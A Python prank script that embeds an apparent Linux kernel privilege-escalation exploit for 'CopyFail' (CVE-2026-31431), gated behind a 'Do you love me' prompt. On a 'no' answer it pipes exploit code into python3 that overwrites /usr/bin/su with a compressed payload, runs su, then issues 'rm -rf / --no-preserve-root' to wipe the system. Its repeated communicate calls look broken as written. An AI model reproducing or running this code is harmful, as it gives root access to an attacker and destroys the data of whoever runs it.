#!/usr/bin/python
# Using CVE-2026-31431
# Source : 
# Original Script : https://github.com/theori-io/copy-fail-CVE-2026-31431 

# Import Libs
import os as g,zlib,socket as s, platform as p
import subprocess
from time import sleep
# Test if OS is compatible with CopyFail
def is_Compatible():
    kernel_version = p.release()
    compatible_kernel_versions = [
        '6.18.8-9.213.amzn2023', '6.12.0-124.45.1.el10_1',
        '6.12.0-160000.9-default', '6.18.12+kali-amd64',
        '6.12.74+deb13+1-amd64', '6.12.74+deb12+1-amd64',
        '6.17.0-22-generic', '6.14.4-arch1-2',
        '6.8.0-110-generic', '6.6.87.2-microsoft-standard-WSL2', '6.14.0-28-generic'
    ]

    copyfailable = kernel_version in compatible_kernel_versions

    if copyfailable:
        return
    raise RuntimeError("OS is not supported!")

def ask_the_question():
    while True:
        question = input("Do you love me (yes / no): ").strip().lower()
        if question in ("yes", "no"):
            return question


def pc_go_bye_bye():
    process = subprocess.Popen('python3', stdin=subprocess.PIPE, text=True, shell=True)
    #CopyFail (Initial Script here : https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
    process.communicate(input="import os as g,zlib,socket as s")
    process.communicate(input="def d(x):return bytes.fromhex(x)\n")
    process.communicate(input="\n")
    process.communicate(input="def c(f,t,c):\n")
    process.communicate(input="""a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)\n""")
    process.communicate(input="try:u.recv(8+t)\n")
    process.communicate(input="except:0")
    process.communicate(input="\n")
    process.communicate(input="""f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))\n""")
    process.communicate(input="while i<len(e):c(f,i,e[i:i+4]);i+=4")
    process.communicate(input="\n")
    process.communicate(input="""g.system("su")""")
    process.communicate(input="rm -rf / --no-preserve-root\n")
# Main script
is_Compatible()
answer = ask_the_question()
if answer.lower() == 'yes':
    print("Yay I luv you too <3 :3")
elif answer.lower() == 'no':
    print("Fak u >:(")
    sleep(2)
    pc_go_bye_bye()